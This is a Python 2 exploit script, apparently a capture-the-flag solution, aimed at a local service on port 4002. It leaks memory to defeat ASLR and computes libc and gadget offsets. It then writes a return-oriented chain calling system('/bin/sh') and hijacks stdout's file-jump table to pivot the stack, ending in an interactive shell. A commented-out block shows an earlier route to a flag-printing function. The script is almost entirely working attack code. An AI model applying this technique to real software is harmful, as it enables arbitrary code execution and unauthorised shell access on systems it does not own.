import struct
import socket
import telnetlib
import time
import sys

def tcp_connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	return s

def recv_until(s, string):
	received = ""

	while string not in received:
		received += s.recv(1)

	return received

while True:
	s = tcp_connect("127.0.0.1", 4002)
	time.sleep(0.1)
	s.send("\x60")
	time.sleep(0.1)
	s.send("\x50")
	response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
	s.send("y")

	code_section = struct.unpack("Q", response[:8])[0] - 0xa50

	if (code_section >> 40) == 0x55 and (code_section & 0x0fff) == 0x000:
		print "Code section @", hex(code_section)
		break
	else:
		s.close()

ezmoney = code_section + 0x90e

print "EzMoney @", hex(ezmoney)

time.sleep(0.1)
s.send("\x30")
time.sleep(0.1)
s.send("\x20")
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

stdout = struct.unpack("Q", response[:8])[0]

print "Stdout @", hex(stdout)
stdout_jump_table = stdout+216
print "Stdout jump table location @", hex(stdout_jump_table)

"""
write the address of EzMoney somewhere in memory so that we can access it later call this location EzMoneyLocation.
overwrite address of _IO_file_jumps in _IO_2_1_stdout_ located at _IO_2_1_stdout_ + 216 with EzMoneyLocation-56
because the first address in the jump table that gets jumped to is located at offset 56 in the jump table.
"""

"""
time.sleep(0.1)
s.send("\x40")
time.sleep(0.1)
s.send("\x40")
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

ezmoneylocation = struct.unpack("Q", response[:8])[0] + 0xc8

print "EzMoneyLocation @", hex(ezmoneylocation)

time.sleep(0.1)
s.send(struct.pack("Q", ezmoneylocation))
time.sleep(0.1)
s.send(struct.pack("Q", ezmoney))
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")
print hex(struct.unpack("Q", response[:8])[0])

time.sleep(0.1)
s.send(struct.pack("Q", stdout_jump_table))
time.sleep(0.1)
s.send(struct.pack("Q", ezmoneylocation - 56))
s.send("y")

flag = recv_until(s, "\n")[:-1]
print flag
"""

time.sleep(0.1)
s.send("\x40")
time.sleep(0.1)
s.send("\x40")
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

print hex(struct.unpack("Q", response[:8])[0])

add_rsp_0x408_location = struct.unpack("Q", response[:8])[0] + 0xc8
pop_rdi_ret_location = struct.unpack("Q", response[:8])[0] - 0x23c0
bin_sh_location = pop_rdi_ret_location + 0x8
libc_system_location = bin_sh_location + 0x8

time.sleep(0.1)
s.send("\x68")
time.sleep(0.1)
s.send("\x30")
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

libc = struct.unpack("Q", response[:8])[0] - 0x20830
add_rsp_0x408 = libc + 0x105167
pop_rdi_ret = libc + 0x21102
bin_sh = libc + 0x18cd57
libc_system = libc + 0x45390

print "Libc @", hex(libc)

time.sleep(0.1)
s.send(struct.pack("Q", pop_rdi_ret_location))
time.sleep(0.1)
s.send(struct.pack("Q", pop_rdi_ret))
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

print hex(struct.unpack("Q", response[:8])[0])

time.sleep(0.1)
s.send(struct.pack("Q", bin_sh_location))
time.sleep(0.1)
s.send(struct.pack("Q", bin_sh))
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

print hex(struct.unpack("Q", response[:8])[0])

time.sleep(0.1)
s.send(struct.pack("Q", libc_system_location))
time.sleep(0.1)
s.send(struct.pack("Q", libc_system))
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

print hex(struct.unpack("Q", response[:8])[0])

time.sleep(0.1)
s.send(struct.pack("Q", add_rsp_0x408_location))
time.sleep(0.1)
s.send(struct.pack("Q", add_rsp_0x408))
response = recv_until(s, "Try again?\n").split("Try again?\n")[0].split("You wrote: ")[1]
s.send("y")

print hex(struct.unpack("Q", response[:8])[0])

#raw_input("Press enter to continue...")

time.sleep(0.1)
s.send(struct.pack("Q", stdout_jump_table))
time.sleep(0.1)
s.send(struct.pack("Q", add_rsp_0x408_location - 56))

t = telnetlib.Telnet()
t.sock = s
t.interact()
